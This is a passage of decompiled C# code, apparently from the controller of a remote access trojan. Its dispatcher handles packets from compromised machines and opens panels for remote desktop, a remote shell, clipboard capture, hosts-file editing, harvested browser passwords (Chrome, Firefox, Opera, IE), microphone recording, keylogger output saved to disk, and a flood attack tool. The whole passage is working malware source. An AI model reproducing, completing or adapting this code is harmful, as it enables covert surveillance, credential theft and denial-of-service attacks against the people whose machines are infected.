											fDesktop.Show();
										}
									}
									else if (Operators.CompareString(left7, "@", false) == 0)
									{
										try
										{
											FDesktop fDesktop2 = (FDesktop)ima.Gform("cap!" + client.ip());
											if (fDesktop2 != null)
											{
												if (array2[3].Length == 1)
												{
													fDesktop2.siz2 = Fungsi.Siz(unchecked((long)array.Length));
													fDesktop2.siz1 = "0 Fps";
													if (Operators.CompareString(fDesktop2.Button1.Text, "Stop", false) == 0)
													{
														client.Send(string.Concat(new string[]
														{
															"@",
															ima.Y,
															Conversions.ToString(fDesktop2.C1.SelectedIndex),
															ima.Y,
															fDesktop2.C2.Text,
															ima.Y,
															Conversions.ToString(fDesktop2.C.Value)
														}));
													}
												}
												else
												{
													byte[] bY = (byte[])NewLateBinding.LateIndexGet(Fungsi.fx(array, "@" + ima.Y), new object[]
													{
														1
													}, null);
													fDesktop2.PktToImage(bY);
												}
											}
										}
										catch (Exception expr_1E65)
										{
											ProjectData.SetProjectError(expr_1E65);
											ProjectData.ClearProjectError();
										}
									}
								}
								return;
							}
							if (Operators.CompareString(left, "SV", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmServices frmServices = (FrmServices)ima.Gform("SV" + client.ip());
									string left8 = array2[2];
									if (Operators.CompareString(left8, "~", false) == 0)
									{
										if (frmServices == null)
										{
											frmServices = new FrmServices();
											frmServices.Name = "SV" + client.ip();
											frmServices.osk = ima.W.GetClient(array2[1]);
											frmServices.sk = client;
											frmServices.Show();
										}
									}
									else if (Operators.CompareString(left8, "!", false) == 0)
									{
										List<string> list2 = new List<string>();
										List<ListViewItem> list3 = new List<ListViewItem>();
										int num8 = array2.Length - 1;
										int num9 = 3;
										frmServices.pr.Value = 0;
										frmServices.pr.Maximum = array2.Length;
										while (num9 <= num8)
										{
											CHProgressbar pr7 = frmServices.pr;
											pr7.Value++;
											frmServices.SL.Text = "Services : " + Conversions.ToString(frmServices.L3.Items.Count);
											string[] array24 = Strings.Split(array2[num9], "[,]", -1, CompareMethod.Binary);
											list2.Add(array24[0].ToLower());
											if (frmServices.L3.Items.ContainsKey(array24[0]))
											{
												ListViewItem listViewItem16 = frmServices.L3.Items[array24[0]];
												listViewItem16.SubItems[3].Text = array24[3];
												listViewItem16.SubItems[4].Text = array24[4];
											}
											else
											{
												ListViewItem listViewItem17 = new ListViewItem(array24[0]);
												int num10 = array24.Length - 1;
												for (int num11 = 1; num11 <= num10; num11++)
												{
													listViewItem17.SubItems.Add(array24[num11]);
												}
												listViewItem17.Name = array24[0];
												list3.Add(listViewItem17);
												if (list3.Count > 20)
												{
													frmServices.L3.Items.AddRange(list3.ToArray());
													list3.Clear();
												}
											}
											num9++;
										}
										if (list3.Count > 0)
										{
											frmServices.L3.Items.AddRange(list3.ToArray());
											list3.Clear();
										}
										List<string> list4 = new List<string>();
										try
										{
											try
											{
												IEnumerator enumerator3 = frmServices.L3.Items.GetEnumerator();
												while (enumerator3.MoveNext())
												{
													ListViewItem listViewItem18 = (ListViewItem)enumerator3.Current;
													if (!list2.Contains(listViewItem18.Text.ToLower()))
													{
														list4.Add(listViewItem18.Text);
													}
												}
											}
											finally
											{
												IEnumerator enumerator3;
												if (enumerator3 is IDisposable)
												{
													(enumerator3 as IDisposable).Dispose();
												}
											}
										}
										finally
										{
											IEnumerator enumerator4;
											if (enumerator4 is IDisposable)
											{
												(enumerator4 as IDisposable).Dispose();
											}
										}
										try
										{
											List<string>.Enumerator enumerator5 = list4.GetEnumerator();
											while (enumerator5.MoveNext())
											{
												string current = enumerator5.Current;
												frmServices.L3.Items.RemoveByKey(current);
											}
										}
										finally
										{
											List<string>.Enumerator enumerator5;
											enumerator5.Dispose();
										}
										frmServices.L3.FX();
									}
								}
								return;
							}
							if (Operators.CompareString(left, "shl", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									FrmShell frmShell = (FrmShell)ima.Gform("sh" + client.ip());
									string left9 = array2[2];
									if (Operators.CompareString(left9, "~", false) == 0)
									{
										if (frmShell == null)
										{
											new FrmShell
											{
												Name = "sh" + client.ip(),
												osk = ima.W.GetClient(array2[1]),
												sk = client
											}.Show();
										}
									}
									else if (Operators.CompareString(left9, "!", false) == 0)
									{
										if (frmShell != null)
										{
											RichTextBox t = frmShell.T1;
											RichTextBox obj5 = t;
											lock (obj5)
											{
												frmShell.T1.SelectionStart = frmShell.T1.TextLength;
												TextBoxBase arg_2383_0 = frmShell.T1;
												string text6 = array2[3].Replace("\r\n", "");
												arg_2383_0.AppendText(Fungsi.DEB(ref text6) + "\r\n");
												frmShell.T1.SelectionStart = frmShell.T1.TextLength;
												frmShell.T1.ScrollToCaret();
											}
										}
									}
									else if (Operators.CompareString(left9, "@", false) == 0 && frmShell != null)
									{
										frmShell.Close();
									}
								}
								return;
							}
							if (Operators.CompareString(left, "clp", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
									return;
								}
								FrmClipboar frmClipboar = (FrmClipboar)ima.Gform("clp" + client.ip());
								if (frmClipboar == null)
								{
									frmClipboar = new FrmClipboar();
									frmClipboar.Name = "clp" + client.ip();
									frmClipboar.sk = client;
									frmClipboar.Show();
								}
								frmClipboar.TextBox1.Text = array2[1];
							}
							else
							{
								if (Operators.CompareString(left, "edhost", false) == 0)
								{
									if (client.L == null)
									{
										client.L = new ListViewItem();
									}
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
										return;
									}
									FrmEditHost frmEditHost = (FrmEditHost)ima.Gform("edhost" + client.ip());
									if (frmEditHost == null)
									{
										frmEditHost = new FrmEditHost();
										frmEditHost.Name = "edhost" + client.ip();
										frmEditHost.sk = client;
										frmEditHost.Show();
									}
									TextBox textBox = frmEditHost.TextBox1;
									TextBox obj6 = textBox;
									lock (obj6)
									{
										frmEditHost.TextBox1.Text = array2[1];
										goto IL_3DCF;
									}
								}
								if (Operators.CompareString(left, "INFO", false) == 0)
								{
									if (client.L == null)
									{
										client.L = new ListViewItem();
									}
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
									}
									else
									{
										FrmInformasi frmInformasi = (FrmInformasi)ima.Gform("in" + client.ip());
										string left10 = array2[2];
										if (Operators.CompareString(left10, "~", false) == 0)
										{
											if (frmInformasi == null)
											{
												new FrmInformasi
												{
													Name = "in" + client.ip(),
													osk = ima.W.GetClient(array2[1]),
													sk = client
												}.Show();
											}
										}
										else if (Operators.CompareString(left10, "!", false) == 0)
										{
											frmInformasi.pr.Value = 0;
											frmInformasi.Lv1.Items.Clear();
											string iPA = Strings.Split(frmInformasi.osk.ip(), ":", -1, CompareMethod.Binary)[0];
											string[] array25 = Strings.Split(array2[3], "[,]", -1, CompareMethod.Binary);
											string text7 = "1. Server Settings\r\n==========================================================\r\n";
											string text8 = "2. General Information\r\n==========================================================\r\n";
											string text9 = "3. System Information\r\n==========================================================\r\n";
											string text10 = "4. Bios Information\r\n==========================================================\r\n";
											frmInformasi.pr.Maximum = array25.Length;
											string[] array26 = array25;
											for (int num12 = 0; num12 < array26.Length; num12++)
											{
												string text11 = array26[num12];
												CHProgressbar pr8 = frmInformasi.pr;
												pr8.Value++;
												if (text11.StartsWith("[server]"))
												{
													string[] array27 = Strings.Split(text11, "\r\n", -1, CompareMethod.Binary);
													ListViewItem listViewItem19 = new ListViewItem();
													listViewItem19.Text = "     " + array27[1];
													listViewItem19.SubItems.Add(array27[2]);
													listViewItem19.Group = frmInformasi.Lv1.Groups["ListViewGroup2"];
													frmInformasi.Lv1.Items.Add(listViewItem19);
													text7 = string.Concat(new string[]
													{
														text7,
														"- ",
														array27[1].Replace("[server]", ""),
														" : ",
														array27[2],
														"\r\n"
													});
												}
												else if (text11.StartsWith("[general]"))
												{
													string[] array28 = Strings.Split(text11, "\r\n", -1, CompareMethod.Binary);
													ListViewItem listViewItem20 = new ListViewItem();
													listViewItem20.Text = "     " + array28[1];
													listViewItem20.SubItems.Add(array28[2]);
													listViewItem20.Group = frmInformasi.Lv1.Groups["ListViewGroup1"];
													frmInformasi.Lv1.Items.Add(listViewItem20);
													text8 = string.Concat(new string[]
													{
														text8,
														"- ",
														array28[1].Replace("[general]", ""),
														" : ",
														array28[2],
														"\r\n"
													});
												}
												else if (text11.StartsWith("[system]"))
												{
													string[] array29 = Strings.Split(text11, "\r\n", -1, CompareMethod.Binary);
													ListViewItem listViewItem21 = new ListViewItem();
													listViewItem21.Text = "     " + array29[1];
													listViewItem21.SubItems.Add(array29[2]);
													listViewItem21.Group = frmInformasi.Lv1.Groups["ListViewGroup3"];
													frmInformasi.Lv1.Items.Add(listViewItem21);
													text9 = string.Concat(new string[]
													{
														text9,
														"- ",
														array29[1].Replace("[system]", ""),
														" : ",
														array29[2],
														"\r\n"
													});
												}
												else if (text11.StartsWith("[BIOS]"))
												{
													string[] array30 = Strings.Split(text11, "\r\n", -1, CompareMethod.Binary);
													ListViewItem listViewItem22 = new ListViewItem();
													listViewItem22.Text = "     " + array30[1];
													listViewItem22.SubItems.Add(array30[2]);
													listViewItem22.Group = frmInformasi.Lv1.Groups["ListViewGroup5"];
													frmInformasi.Lv1.Items.Add(listViewItem22);
													text10 = string.Concat(new string[]
													{
														text10,
														"- ",
														array30[1].Replace("[BIOS]", ""),
														" : ",
														array30[2],
														"\r\n"
													});
												}
											}
											frmInformasi.SV = string.Concat(new string[]
											{
												"==========================================================\r\n",
												text7,
												"==========================================================\r\n",
												text8,
												"==========================================================\r\n",
												text9,
												"==========================================================\r\n",
												text10,
												"==========================================================\r\n"
											});
											frmInformasi.Lv1.FX();
											frmInformasi.Lv1.Items[6].SubItems[1].Text = ima.GeoIP.LookupCountryName(iPA);
										}
									}
									return;
								}
								if (Operators.CompareString(left, "PS", false) == 0)
								{
									if (client.L == null)
									{
										client.L = new ListViewItem();
									}
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
									}
									else
									{
										FrmStoredPassword frmStoredPassword = (FrmStoredPassword)ima.Gform("ps" + client.ip());
										string left11 = array2[2];
										if (Operators.CompareString(left11, "~", false) == 0)
										{
											if (frmStoredPassword == null)
											{
												frmStoredPassword = new FrmStoredPassword();
												frmStoredPassword.Name = "ps" + client.ip();
												frmStoredPassword.osk = ima.W.GetClient(array2[1]);
												frmStoredPassword.sk = client;
												frmStoredPassword.Show();
											}
											frmStoredPassword.pr.Value = 0;
											frmStoredPassword.L1.Items.Clear();
											string[] array31 = Strings.Split(array2[3], "[-]", -1, CompareMethod.Binary);
											frmStoredPassword.pr.Maximum = array31.Length;
											string[] array32 = array31;
											for (int num13 = 0; num13 < array32.Length; num13++)
											{
												string text12 = array32[num13];
												CHProgressbar pr9 = frmStoredPassword.pr;
												pr9.Value++;
												if (Operators.CompareString(text12, "", false) != 0)
												{
													string[] array33 = Strings.Split(text12, "[,]", -1, CompareMethod.Binary);
													ListViewItem listViewItem23 = new ListViewItem();
													listViewItem23.Text = array33[3];
													listViewItem23.SubItems.Add(array33[4]);
													listViewItem23.SubItems.Add(array33[1]);
													listViewItem23.SubItems.Add(array33[2]);
													if (Operators.CompareString(array33[2], "Opera", false) == 0)
													{
														listViewItem23.ImageIndex = 8;
													}
													else if (Operators.CompareString(array33[2], "Chrome", false) == 0)
													{
														listViewItem23.ImageIndex = 5;
													}
													else if (Operators.CompareString(array33[2], "Firefox 3.5/4", false) == 0)
													{
														listViewItem23.ImageIndex = 4;
													}
													else if (Operators.CompareString(array33[2], "Firefox 32+", false) == 0)
													{
														listViewItem23.ImageIndex = 4;
													}
													else if (Operators.CompareString(array33[2], "Internet Explorer 7.0 - 9.0", false) == 0)
													{
														listViewItem23.ImageIndex = 9;
													}
													else if (Operators.CompareString(array33[2], "Internet Explorer 7.0 - 8.0", false) == 0)
													{
														listViewItem23.ImageIndex = 9;
													}
													else
													{
														listViewItem23.ImageIndex = 13;
													}
													frmStoredPassword.L1.Items.Add(listViewItem23);
												}
											}
											frmStoredPassword.L1.FX();
											frmStoredPassword.SL.Text = "Account(s) : " + Conversions.ToString(frmStoredPassword.L1.Items.Count);
										}
									}
								}
								else
								{
									if (Operators.CompareString(left, "MIC", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmMic frmMic = (FrmMic)ima.Gform("mic" + client.ip());
											string left12 = array2[2];
											if (Operators.CompareString(left12, "~", false) == 0)
											{
												if (frmMic == null)
												{
													new FrmMic
													{
														Name = "mic" + client.ip(),
														osk = ima.W.GetClient(array2[1]),
														sk = client
													}.Show();
												}
											}
											else if (Operators.CompareString(left12, "!", false) == 0)
											{
												try
												{
													new Random();
													File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(frmMic.folder, Fungsi.DT()), ".wav")), Convert.FromBase64String(array2[3]));
													frmMic.wa();
													frmMic.Button1.Enabled = true;
												}
												catch (Exception expr_2F9C)
												{
													ProjectData.SetProjectError(expr_2F9C);
													ProjectData.ClearProjectError();
												}
											}
										}
										return;
									}
									if (Operators.CompareString(left, "TCP", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmConnections frmConnections = (FrmConnections)ima.Gform("tcp" + client.ip());
											string left13 = array2[2];
											if (Operators.CompareString(left13, "~", false) == 0)
											{
												if (frmConnections == null)
												{
													new FrmConnections
													{
														Name = "tcp" + client.ip(),
														osk = ima.W.GetClient(array2[1]),
														sk = client
													}.Show();
												}
											}
											else if (Operators.CompareString(left13, "!", false) == 0)
											{
												string[] array34 = Strings.Split(array2[3], "*", -1, CompareMethod.Binary);
												frmConnections.pr.Visible = true;
												frmConnections.pr.Value = 0;
												frmConnections.pr.Maximum = array34.Length;
												List<ListViewItem> list5 = new List<ListViewItem>();
												int num14 = array34.Length - 1;
												for (int num15 = 0; num15 <= num14; num15++)
												{
													CHProgressbar pr10 = frmConnections.pr;
													pr10.Value++;
													string[] array35 = Strings.Split(array34[num15], ",", -1, CompareMethod.Binary);
													if (frmConnections.LTCP.Items.ContainsKey(array35[0] + array35[1]))
													{
														ListViewItem listViewItem24 = frmConnections.LTCP.Items[array35[0] + array35[1]];
														listViewItem24.SubItems[4].Text = ((TcpState)Conversions.ToInteger(array35[2])).ToString();
														Color arg_31A2_0 = listViewItem24.ForeColor;
														switch (Conversions.ToInteger(array35[2]))
														{
														case 1:
														case 8:
														case 9:
														case 11:
														case 12:
															listViewItem24.ForeColor = Color.Red;
															break;
														case 4:
															listViewItem24.ForeColor = Color.YellowGreen;
															break;
														case 5:
															listViewItem24.ForeColor = Color.LimeGreen;
															break;
														}
													}
													else
													{
														ListViewItem listViewItem25 = new ListViewItem(array35[0].Split(new char[]
														{
															':'
														})[0]);
														listViewItem25.Name = array35[0] + array35[1];
														listViewItem25.Tag = array35[0] + array35[1];
														listViewItem25.SubItems.Add(array35[0].Split(new char[]
														{
															':'
														})[1]);
														listViewItem25.SubItems.Add(array35[1].Split(new char[]
														{
															':'
														})[0]);
														listViewItem25.SubItems.Add(array35[1].Split(new char[]
														{
															':'
														})[1]);
														listViewItem25.SubItems.Add(((TcpState)Conversions.ToInteger(array35[2])).ToString());
														listViewItem25.SubItems.Add(array35[3]);
														switch (Conversions.ToInteger(array35[2]))
														{
														case 1:
														case 8:
														case 9:
														case 11:
														case 12:
															listViewItem25.ForeColor = Color.Red;
															break;
														case 3:
														case 4:
															listViewItem25.ForeColor = Color.YellowGreen;
															break;
														case 5:
															listViewItem25.ForeColor = Color.LimeGreen;
															break;
														}
														list5.Add(listViewItem25);
														if (list5.Count > 20)
														{
															frmConnections.LTCP.Items.AddRange(list5.ToArray());
															list5.Clear();
														}
													}
												}
												if (list5.Count > 0)
												{
													frmConnections.LTCP.Items.AddRange(list5.ToArray());
													list5.Clear();
												}
											}
											else if (Operators.CompareString(left13, "RM", false) == 0)
											{
												int num16 = array2.Length - 1;
												for (int num17 = 3; num17 <= num16; num17++)
												{
													frmConnections.LTCP.Items.RemoveByKey(array2[num17]);
												}
											}
											else if (Operators.CompareString(left13, "ER", false) == 0)
											{
												frmConnections.sl.Text = array2[3];
											}
										}
										return;
									}
									if (Operators.CompareString(left, "UNP", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmInstalled frmInstalled = (FrmInstalled)ima.Gform("unp" + client.ip());
											string left14 = array2[2];
											if (Operators.CompareString(left14, "~", false) == 0)
											{
												if (frmInstalled == null)
												{
													new FrmInstalled
													{
														Name = "unp" + client.ip(),
														osk = ima.W.GetClient(array2[1]),
														sk = client
													}.Show();
												}
											}
											else if (Operators.CompareString(left14, "!", false) == 0)
											{
												string[] array36 = Strings.Split(array2[3], "\r\n", -1, CompareMethod.Binary);
												frmInstalled.pr.Visible = true;
												frmInstalled.pr.Value = 0;
												frmInstalled.pr.Maximum = array36.Length;
												string[] array37 = array36;
												for (int num18 = 0; num18 < array37.Length; num18++)
												{
													string text13 = array37[num18];
													CHProgressbar pr11 = frmInstalled.pr;
													pr11.Value++;
													if (Operators.CompareString(text13, "N/A%|%", false) != 0)
													{
														string[] array38 = Strings.Split(text13, "%|%", -1, CompareMethod.Binary);
														ListViewItem listViewItem26 = new ListViewItem();
														listViewItem26.Text = array38[0];
														listViewItem26.ImageIndex = 0;
														frmInstalled.L1.Items.Add(listViewItem26);
														frmInstalled.SL.Text = "Programs : " + Conversions.ToString(frmInstalled.L1.Items.Count);
													}
												}
											}
										}
										return;
									}
									if (Operators.CompareString(left, "FUN", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmFun frmFun = (FrmFun)ima.Gform("fn" + client.ip());
											string left15 = array2[2];
											if (Operators.CompareString(left15, "~", false) == 0 && frmFun == null)
											{
												new FrmFun
												{
													Name = "fn" + client.ip(),
													osk = ima.W.GetClient(array2[1]),
													sk = client
												}.Show();
											}
										}
										return;
									}
									if (Operators.CompareString(left, "klog", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmLogger frmLogger = (FrmLogger)ima.Gform("klog" + client.ip());
											string left16 = array2[1];
											if (Operators.CompareString(left16, "~", false) == 0)
											{
												if (frmLogger == null)
												{
													frmLogger = new FrmLogger();
													frmLogger.Name = "klog" + client.ip();
													frmLogger.sk = client;
													frmLogger.Show();
												}
												frmLogger.Lv1.Items.Clear();
												string[] array39 = Strings.Split(array2[2], "[,]", -1, CompareMethod.Binary);
												frmLogger.pr.Value = 0;
												frmLogger.pr.Maximum = array39.Length;
												string[] array40 = array39;
												for (int num19 = 0; num19 < array40.Length; num19++)
												{
													string text14 = array40[num19];
													CHProgressbar pr12 = frmLogger.pr;
													pr12.Value++;
													ListViewItem listViewItem27 = new ListViewItem();
													if (Operators.CompareString(text14, null, false) != 0)
													{
														listViewItem27.Text = text14;
														listViewItem27.ImageIndex = 0;
														frmLogger.Lv1.Items.Add(listViewItem27);
													}
													frmLogger.Lv1.FX();
												}
											}
											else
											{
												if (Operators.CompareString(left16, "!", false) == 0)
												{
													FrmLogger frmLogger2 = (FrmLogger)ima.Gform("klog" + client.ip());
													FrmLogger frmLogger3 = frmLogger2;
													FrmLogger obj7 = frmLogger3;
													lock (obj7)
													{
														frmLogger2.T1.Clear();
														string[] array41 = Strings.Split(array2[2], "\r\n", -1, CompareMethod.Binary);
														frmLogger2.pr.Value = 0;
														frmLogger2.pr.Maximum = array41.Length;
														string[] array42 = array41;
														for (int num20 = 0; num20 < array42.Length; num20++)
														{
															string t2 = array42[num20];
															frmLogger2.insert(t2);
															CHProgressbar pr13 = frmLogger2.pr;
															pr13.Value++;
															frmLogger.sl.Text = "Logger(s) : " + Conversions.ToString(frmLogger.Lv1.Items.Count);
														}
														frmLogger2.T1.ScrollToCaret();
														if (!Directory.Exists(client.Folder))
														{
															Directory.CreateDirectory(client.Folder);
														}
														frmLogger2.T1.SaveFile(Conversions.ToString(Operators.ConcatenateObject(frmLogger2.folder, " KeyLogger.rtf")));
														return;
													}
												}
												if (Operators.CompareString(left16, "@", false) == 0)
												{
													client.L.UseItemStyleForSubItems = false;
													if (client.L != null && client.L.SubItems.Count > ima.hfld)
													{
														ListView.ListViewItemCollection items = ima.F.L1.Items;
														Conversions.ToInteger(array2[2]);
														ListView.ListViewItemCollection obj8 = items;
														lock (obj8)
														{
															if (Operators.CompareString(array2[Conversions.ToInteger(array2[2])], "Not Found", false) == 0)
															{
																client.L.SubItems.Add(array2[Conversions.ToInteger(array2[2])]).ForeColor = Color.Red;
															}
															else
															{
																client.L.SubItems.Add(array2[Conversions.ToInteger(array2[2])]).ForeColor = Color.Lime;
															}
														}
													}
												}
											}
										}
										return;
									}
									if (Operators.CompareString(left, "inpl", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmInfoPlugin frmInfoPlugin = (FrmInfoPlugin)ima.Gform("inpl" + client.ip());
											if (frmInfoPlugin == null)
											{
												frmInfoPlugin = new FrmInfoPlugin();
												frmInfoPlugin.Name = "inpl" + client.ip();
												frmInfoPlugin.sk = client;
												frmInfoPlugin.Show();
											}
											frmInfoPlugin.Lv1.Items.Clear();
											string[] array43 = Strings.Split(array2[1], "[,]", -1, CompareMethod.Binary);
											frmInfoPlugin.pr.Value = 0;
											frmInfoPlugin.pr.Maximum = array43.Length;
											string[] array44 = array43;
											for (int num21 = 0; num21 < array44.Length; num21++)
											{
												string text15 = array44[num21];
												CHProgressbar pr14 = frmInfoPlugin.pr;
												pr14.Value++;
												ListViewItem listViewItem28 = new ListViewItem();
												if (Operators.CompareString(text15, null, false) != 0)
												{
													listViewItem28.Text = text15;
													frmInfoPlugin.Lv1.Items.Add(text15, 0);
													frmInfoPlugin.SL.Text = "Plugin(s) : " + Conversions.ToString(frmInfoPlugin.Lv1.Items.Count);
												}
												frmInfoPlugin.Lv1.FX();
											}
										}
										return;
									}
									if (Operators.CompareString(left, "FLD", false) == 0)
									{
										if (client.L == null)
										{
											client.L = new ListViewItem();
										}
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											FrmFlood frmFlood = (FrmFlood)ima.Gform("fld" + client.ip());
											string left17 = array2[2];
											if (Operators.CompareString(left17, "~", false) == 0)
											{
												if (frmFlood == null)
												{
													new FrmFlood
													{
														Name = "fld" + client.ip(),
														osk = ima.W.GetClient(array2[1]),
														sk = client
													}.Show();
												}
											}
											else if (Operators.CompareString(left17, "!", false) == 0)
											{
												frmFlood.sl.Text = array2[3];
											}
										}
										return;
									}
								}
							}
						}
						IL_3DCF:
						if (Operators.CompareString(text, "CH", false) == 0)
						{
							if (client.L == null)
							{
								client.L = new ListViewItem();
							}
							if (ima.F.InvokeRequired)
							{
								ima.F.Invoke(new ima._Req(ima.Req), new object[]
								{
									RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
								});
							}
							else
							{
								FrmChat frmChat = (FrmChat)ima.Gform("ch" + client.ip());
								string left18 = array2[2];
								if (Operators.CompareString(left18, "~", false) == 0)
								{
									if (frmChat == null)
									{
										new FrmChat
										{
											Name = "ch" + client.ip(),
											sk = client,
											osk = ima.W.GetClient(array2[1]),
											T2 = 
											{
												Enabled = false
											}
										}.Show();
									}
								}
								else
								{
									if (Operators.CompareString(left18, "!", false) == 0)
									{
										frmChat.T2.Enabled = true;
										FrmChat frmChat2 = frmChat;
										FrmChat obj9 = frmChat2;
										lock (obj9)
										{
											frmChat.T1.AppendText("Connected ..\r\n");
											goto IL_4018;
										}
									}
									if (Operators.CompareString(left18, "@", false) == 0)
									{
										FrmChat frmChat3 = frmChat;
										FrmChat obj10 = frmChat3;
										lock (obj10)
										{
											frmChat.T1.SelectionStart = frmChat.T1.TextLength;
											frmChat.T1.SelectionFont = new Font(frmChat.T1.Font, FontStyle.Bold);
											frmChat.T1.SelectionColor = Color.RoyalBlue;
											frmChat.T1.AppendText(Fungsi.HM() + " User : ");
											frmChat.T1.SelectionFont = frmChat.T1.Font;
											frmChat.T1.SelectionStart = frmChat.T1.TextLength;
											frmChat.T1.SelectionColor = Color.WhiteSmoke;
											frmChat.T1.AppendText(Fungsi.DEB(ref array2[3]) + "\r\n");
											frmChat.T1.ScrollToCaret();
										}
									}
								}
							}
							IL_4018:;
						}
						else
						{
							if (Operators.CompareString(text, "klogasas!", false) == 0)
							{
								FrmLogger frmLogger4 = (FrmLogger)ima.Gform("kl" + client.ip());
								FrmLogger frmLogger5 = frmLogger4;
								FrmLogger obj11 = frmLogger5;
								lock (obj11)
								{
									frmLogger4.T1.Clear();
									string[] array45 = Strings.Split(array2[1], "\r\n", -1, CompareMethod.Binary);
									frmLogger4.pr.Value = 0;
									frmLogger4.pr.Maximum = array45.Length;
									string[] array46 = array45;
									for (int num22 = 0; num22 < array46.Length; num22++)
									{
										string t3 = array46[num22];
										frmLogger4.insert(t3);
										CHProgressbar pr15 = frmLogger4.pr;
										pr15.Value++;
									}
									frmLogger4.T1.ScrollToCaret();
									if (!Directory.Exists(client.Folder))
									{
										Directory.CreateDirectory(client.Folder);
									}
									frmLogger4.T1.SaveFile(client.Folder + "Keylog.rtf");
									return;
								}
							}
							if (Operators.CompareString(text, "klosadasg", false) == 0)
							{
								if (ima.F.InvokeRequired)
								{
									ima.F.Invoke(new ima._Req(ima.Req), new object[]
									{
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
									});
								}
								else
								{
									if (ima.Gform("kl" + client.ip()) == null)
									{
										new FrmLogger
										{
											c = client,
											Name = "kl" + client.ip(),
											Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(ima.vno(client.L)))
										}.Show();
									}
									Thread thread = new Thread(new ParameterizedThreadStart(ima.Req));
									Thread arg_4224_0 = thread;
									object[] array47 = new object[2];
									array47[0] = client;
									object[] arg_4222_0 = array47;
									int arg_4222_1 = 1;
									string text6 = "klog" + ima.Y + array2[1];
									arg_4222_0[arg_4222_1] = Fungsi.SB(ref text6);
									arg_4224_0.Start(array47);
								}
							}
							else if (Operators.CompareString(text, "inf", false) == 0)
							{
								List<string> list6 = new List<string>();
								list6.Add(Fungsi.DEB(ref array2[1]));
								int num23 = array2.Length - 1;
								for (int num24 = 2; num24 <= num23; num24++)
								{
									list6.Add(array2[num24]);
								}
								client.snf = list6.ToArray();
								if (client.L != null)
								{
									string[] array48 = Strings.Split(Fungsi.DEB(ref array2[1]), "\r\n", -1, CompareMethod.Binary);
									string text16 = "+++ Server Info";
									int num25 = array48.Length - 1;
									for (int num26 = 0; num26 <= num25; num26++)
									{
										text16 = string.Concat(new string[]
										{
											text16,
											"\r\n{",
											Conversions.ToString(num26),
											"}  ",
											array48[num26]
										});
									}
									ima.F.L1.Items[0].SubItems[0].Text = string.Format(text16, new object[]
									{
										"Name",
										"Host",
										"Dir",
										"Exe"
									});
								}
							}
							else if (Operators.CompareString(text, "CAM", false) == 0)
							{
								if (client.L == null)
								{
